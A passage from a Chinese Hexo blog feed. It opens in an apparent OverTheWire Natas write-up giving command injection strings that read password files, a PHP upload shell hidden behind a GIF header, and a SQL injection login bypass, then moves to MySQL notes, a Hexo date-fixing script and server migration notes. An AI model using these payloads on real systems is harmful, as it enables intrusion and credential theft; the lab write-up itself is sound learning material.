并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 <em>image/gif</em>， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><h3 id="参数-¶"><a href="#参数-¶" class="headerlink" title="参数 ¶"></a>参数<a href="https://www.php.net/manual/zh/function.passthru.php#refsect1-function.passthru-parameters"> ¶</a></h3><ul><li><p><code>command</code></p><p>  要执行的命令。</p></li><li><p><code>return_var</code></p><p>  如果提供 <code>return_var</code> 参数， Unix 命令的返回状态会被记录到此参数。</p></li></ul></blockquote><p>密码均存储在/etc/natas_webpass目录下（百度来的</p><p> <code>passthru(&quot;grep -i $key dictionary.txt&quot;);</code></p><p>并且在shell中，#可以注释掉后面的</p><p>所以当</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$key</span> = | cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10 <span class="hljs-comment">#</span><br><span class="hljs-variable">$key</span> = &amp; cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10 <span class="hljs-comment">#</span><br><span class="hljs-variable">$key</span> = | cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10<br><span class="hljs-variable">$key</span> = &amp; cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10<br></code></pre></td></tr></table></figure><p>时，对应的shell命令为</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -i | cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10 dictionary.txt<br><span class="hljs-keyword">grep</span> -i &amp; cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10<br></code></pre></td></tr></table></figure><p>这样都行</p><h2 id="natas10"><a href="#natas10" class="headerlink" title="natas10"></a>natas10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[;|&amp;]/&#x27;</span>,<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Input contains an illegal character!&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        passthru(<span class="hljs-string">&quot;grep -i <span class="hljs-subst">$key</span> dictionary.txt&quot;</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><blockquote><ul><li>Search in case-insensitive mode:<br>  grep -i search_string path/to/file</li></ul></blockquote><p>grep还可以用正则，所以这里</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$key</span> = [a-zA-Z] <span class="hljs-regexp">/etc/</span>natas_webpass/natas11 <span class="hljs-comment">#</span><br>grep -i [a-zA-Z] <span class="hljs-regexp">/etc/</span>natas_webpass/natas11 <span class="hljs-comment"># dictionary.txt</span><br></code></pre></td></tr></table></figure><h2 id="natas12"><a href="#natas12" class="headerlink" title="natas12"></a>natas12</h2><p>把文件名随机了，把后缀改成jpg了</p><p>内容没有检测，尝试upload的时候用bp把文件后缀改成php就可以打开，那</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br>    passthru(<span class="hljs-string">&#x27;cat /etc/natas_webpass/natas13&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="natas13"><a href="#natas13" class="headerlink" title="natas13"></a>natas13</h2><p>通过 <code>php</code>的函数 <code>exif_imagetype()</code> 来判断文件夹类型，</p><p>可以查看php的文档，这个函数通过检查文件的签名（第一个字节），从而检测文件类型。</p><p>可以用<a href="https://blog.csdn.net/piaolankeke/article/details/5872876">GIF98a</a>来骗过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF98a<br><span class="hljs-meta">&lt;?</span><br>    passthru(<span class="hljs-string">&#x27;cat /etc/natas_webpass/natas14&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="natas14"><a href="#natas14" class="headerlink" title="natas14"></a>natas14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;\&quot; and password=\&quot;&quot;</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;password&quot;</span>].<span class="hljs-string">&quot;\&quot;&quot;</span>; <br></code></pre></td></tr></table></figure><p>万能sql密码<code>&quot; OR 1=1 #</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * from users where username&#x3D;&quot;&quot; OR 1&#x3D;1 # and password&#x3D; &quot;&quot;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库使用&amp;学习记录</title>
    <link href="/2020/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8&amp;%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8&amp;%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>GRANT CREATE TABLE TO  { PUBLIC | GROUP group | username }</p><p>GRANT ALTER TABLE</p><p><a href="https://blog.csdn.net/haydenwang8287/article/details/2105999">Grant的用法</a></p><h2 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h2><p>一个窗口</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">mysqld</span> --<span class="hljs-comment">shared</span><span class="hljs-literal">-</span><span class="hljs-comment">memory</span> --<span class="hljs-comment">skip</span><span class="hljs-literal">-</span><span class="hljs-comment">grant</span><span class="hljs-literal">-</span><span class="hljs-comment">tables</span><br></code></pre></td></tr></table></figure><p>另一个窗口</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql -u root -p<br>//press enter<br>FLUSH <span class="hljs-keyword">PRIVILEGES</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;你要设置的密码&#x27;</span><br>FLUSH <span class="hljs-keyword">PRIVILEGES</span><br></code></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#DELETE FROM SeatInformation  <br><br><br>&#x2F;*DELETE FROM SeatInformation *&#x2F;<br>-- DELETE FROM SeatInformation<br></code></pre></td></tr></table></figure><h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql"><br>&#x2F;&#x2F;普通索引<br>CREATE INDEX indexName ON table_name(column_name)<br><br>&#x2F;&#x2F;唯一索引<br>CREATE UNIQUE INDEX indexName ON table_name (column_name)<br><br>&#x2F;&#x2F;使用hash索引方法<br>CREATE INDEX indexName ON table_name(column_name) using hash <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo升级跳坑</title>
    <link href="/2020/04/07/hexo%E5%8D%87%E7%BA%A7%E8%B7%B3%E5%9D%91/"/>
    <url>/2020/04/07/hexo%E5%8D%87%E7%BA%A7%E8%B7%B3%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>应该是从4.0升级到4.2，_config.yml的更改就不说了，主要讲讲昨天晚上都干了啥（吐血捂肝</p><p>4.2多了个友链（万恶起源）上来之后，最开始的变化就是，所有文章的日期都变成了<strong>创建时间</strong>，即便<strong>修改时间</strong>比创建时间还早0.0</p><p>于是，写了脚本给每个文章加上date，确定最早的发布/创建时间，并且，没有这个<a href="https://hexo.io/zh-cn/docs/front-matter">Front-matter</a>是会报莫名其妙的YAMLException的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> datetime<br>fpath = os.getcwd()<br>path=os.path.abspath(os.path.dirname(__file__))<br><span class="hljs-comment">#时间戳变成</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift_time</span>(<span class="hljs-params">filename</span>):</span><br>    time_stamp_create = os.path.getctime(filename)<br>    time_stamp_modify = os.path.getmtime(filename)<br>    <span class="hljs-keyword">if</span> time_stamp_create &gt; time_stamp_modify:<br>        time_stamp = time_stamp_modify<br>    <span class="hljs-keyword">else</span> :<br>        time_stamp = time_stamp_create<br>    dateArray = datetime.datetime.fromtimestamp(time_stamp)  <br>    <span class="hljs-keyword">return</span> dateArray.strftime(<span class="hljs-string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>) <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writeback</span>(<span class="hljs-params">filename,text</span>):</span><br>    s = <span class="hljs-string">&#x27;&#x27;</span>.join(text)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename , <span class="hljs-string">&quot;w&quot;</span> , encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,) <span class="hljs-keyword">as</span> f:<br>        f.write(s)<br><br><span class="hljs-comment">#将文件创建时间或修改时间，最早的一个，写入date中，作为文章时间</span><br><span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:         <br>        temp=os.path.splitext(filename)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.md&quot;</span>:<br>            headline = <span class="hljs-literal">False</span><br>            head_exist = <span class="hljs-literal">False</span><br>            date_exist = <span class="hljs-literal">False</span><br>            line_num = <span class="hljs-literal">False</span><br>            create_date = shift_time(filename) <br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>                line_num += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;---\n&quot;</span>:<br>                    headline += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;date:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                    date_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> headline == <span class="hljs-number">2</span>:<br>                    head_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> line_num == <span class="hljs-number">10</span>:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> date_exist:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> head_exist:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">1</span> , <span class="hljs-string">&quot;date: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                writeback(filename,text)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">0</span> , <span class="hljs-string">&quot;---\ndate: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n---\n&#x27;</span>)<br>                writeback(filename,text)<br></code></pre></td></tr></table></figure><p>这部分修改好了之后呢，跑起来测试之后发现图片加载不了了，原来的hexo-assets-image的图片src地址有误，没法用了，换了<a href="https://github.com/cocowool/hexo-image-link">hexo-image-link</a>之后，可以是可以了，但是我原先的结构不能用了QAQ</p><blockquote><p>原先是图片都放在 markdown.assets/xxx.png 这样的，现在根据 官方和 image-link 的呢，只能改成  markdown/xxx.png 这样了 于是又写了这部分代码QAQ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#先找到.assets文件夹，然后再去找md文件替换掉文件里的xxx.assets/image的.assets</span><br><span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> os.listdir():<br>    <span class="hljs-keyword">if</span> folder == <span class="hljs-string">&quot;.vscode&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> os.path.isdir(folder)==<span class="hljs-literal">True</span>:<br>        temp=os.path.splitext(folder)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.assets&quot;</span>:<br>            <span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>                <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:  <br>                    <span class="hljs-keyword">if</span> filename == file + <span class="hljs-string">&#x27;.md&#x27;</span>:<br>                        text = []<br>                        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                            text.append(line.replace(<span class="hljs-string">&quot;.assets&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br>                        writeback(file + <span class="hljs-string">&#x27;.md&#x27;</span>,text)<br>        new_name=folder.replace(<span class="hljs-string">&#x27;.assets&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        os.rename(os.path.join(path,folder),os.path.join(path,new_name))<br></code></pre></td></tr></table></figure><p>再加上调下typora的<strong>插入图片时</strong>改为复制到指定路径即可。</p><p>这样，我本地看也没有任何问题，发布出去也不会有问题，耶✌</p><p>懒才是最强生产力（确信</p><p>所以现在就是双击Winclick.bat 跑run.py。写完就丢嘿嘿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#run.py</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> datetime<br>fpath = os.getcwd()<br>path=os.path.abspath(os.path.dirname(__file__))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift_time</span>(<span class="hljs-params">filename</span>):</span><br>    time_stamp_create = os.path.getctime(filename)<br>    time_stamp_modify = os.path.getmtime(filename)<br>    <span class="hljs-keyword">if</span> time_stamp_create &gt; time_stamp_modify:<br>        time_stamp = time_stamp_modify<br>    <span class="hljs-keyword">else</span> :<br>        time_stamp = time_stamp_create<br>    dateArray = datetime.datetime.fromtimestamp(time_stamp)  <br>    <span class="hljs-keyword">return</span> dateArray.strftime(<span class="hljs-string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>) <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writeback</span>(<span class="hljs-params">filename,text</span>):</span><br>    s = <span class="hljs-string">&#x27;&#x27;</span>.join(text)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename , <span class="hljs-string">&quot;w&quot;</span> , encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,) <span class="hljs-keyword">as</span> f:<br>        f.write(s)<br><br><span class="hljs-comment">#将文件创建时间或修改时间，最早的一个，写入date中，作为文章时间</span><br><span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:         <br>        temp=os.path.splitext(filename)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.md&quot;</span>:<br>            headline = <span class="hljs-literal">False</span><br>            head_exist = <span class="hljs-literal">False</span><br>            date_exist = <span class="hljs-literal">False</span><br>            line_num = <span class="hljs-literal">False</span><br>            create_date = shift_time(filename) <br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>                line_num += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;---\n&quot;</span>:<br>                    headline += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;date:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                    date_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> headline == <span class="hljs-number">2</span>:<br>                    head_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> line_num == <span class="hljs-number">10</span>:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> date_exist:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> head_exist:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">1</span> , <span class="hljs-string">&quot;date: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                writeback(filename,text)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">0</span> , <span class="hljs-string">&quot;---\ndate: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n---\n&#x27;</span>)<br>                writeback(filename,text)<br>   <br><span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> os.listdir():<br>    <span class="hljs-keyword">if</span> folder == <span class="hljs-string">&quot;.vscode&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> os.path.isdir(folder)==<span class="hljs-literal">True</span>:<br>        temp=os.path.splitext(folder)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.assets&quot;</span>:<br>            <span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>                <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:  <br>                    <span class="hljs-keyword">if</span> filename == file + <span class="hljs-string">&#x27;.md&#x27;</span>:<br>                        text = []<br>                        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                            text.append(line.replace(<span class="hljs-string">&quot;.assets&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br>                        writeback(file + <span class="hljs-string">&#x27;.md&#x27;</span>,text)<br>        new_name=folder.replace(<span class="hljs-string">&#x27;.assets&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        os.rename(os.path.join(path,folder),os.path.join(path,new_name))<br><br>os.system((<span class="hljs-string">&#x27;cd &#123;&#125; &amp;&amp; hexo clean &amp;&amp; hexo gen &amp;&amp; hexo deploy&#x27;</span>).<span class="hljs-built_in">format</span>(path))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记一次转移环境上服务器</title>
    <link href="/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>本想着本地docker调好直接传上去的，然鹅一开vscode remote就崩</p><p>并且，vscode remote也仅指本地的docker里，不是云服务器的环境，QAQ</p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>xftp 学生免费版，可了</p><p>安装好数据库后，记得设置密码，<a href="https://www.mysqlzh.com/doc/19/63.html">参考</a></p><p>修改utf8为utf8mb4</p><p><code>vim /etc/mysql/my.cnf</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">character-set-server</span>=utf8mb4<br><br><span class="hljs-section">[mysql]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br><br><span class="hljs-section">[client]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4                  <br></code></pre></td></tr></table></figure><p>数据导出，mysql 在powershell 使用mysqldump，使用的是utb-16编码，cmd里导出的就是utf8</p><blockquote><p>ERROR 1273 (HY000) at line 22: Unknown collation: ‘utf8mb4_0900_ai_ci’</p><p>文件中的所有的<code>utf8mb4_0900_ai_ci</code>替换为<code>utf8_general_ci</code></p><p>因为我这里都是使用utf8mb4的，如果是使用utf8的，把<code>utf8mb4</code>替换为<code>utf8</code></p></blockquote><p>然后<code>mysql -u root -p parking &lt; parking.sql</code></p><p>表写入数据库中。</p><blockquote><p>此处出现了写入表后，退出再进入无记录的情况，原因不明。但是在我把mysql5.7更换到跟开发环境相同的mysql8.0后（之前以为是8.0QAQ）再次写入就可以了</p></blockquote><h2 id="配置与部署"><a href="#配置与部署" class="headerlink" title="配置与部署"></a>配置与部署</h2><p>由于还没有摸透nginx和uwgsi，故先用了runserver的简陋（菜）形式测试了先，阿里云打开端口。==中间无数次临时debug，让我感觉到如果是本地改完远程直接同步会有多么的便利==</p><p>待补，nginx和uwgsi</p><h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>当然，以上并不是真正部署一个项目运行</p><p>可能在docker中开发测试好直接丢服务器上是最佳选择（当然跟我本地没测试通全部也有很大关系，主要还是测试不够）</p><p>然后在服务器升级环境的过程中，也一度只能干巴巴等着，好在阿里云的下载速度还是很快的。</p><p>结束之后，尝试了tmux，默认时候不能鼠标切换切分出来的窗口0.0（可能主要因为没设置好）</p><p>随后发现terminus自带了切分屏幕（哎，暴殄天物）</p><img src="/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200407022222234.png" class="" title="image-20200407022222234"><p><strong>再次说明，项目不是真正部署了的QAQ，仅一点记录</strong></p><p>可参考的link：</p><p><a href="https://blog.csdn.net/qq_41448891/article/details/90696004">https://blog.csdn.net/qq_41448891/article/details/90696004</a></p><p><a href="https://www.cnblogs.com/chenice/p/6921727.html">https://www.cnblogs.com/chenice/p/6921727.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>django学习记录</title>
    <link href="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
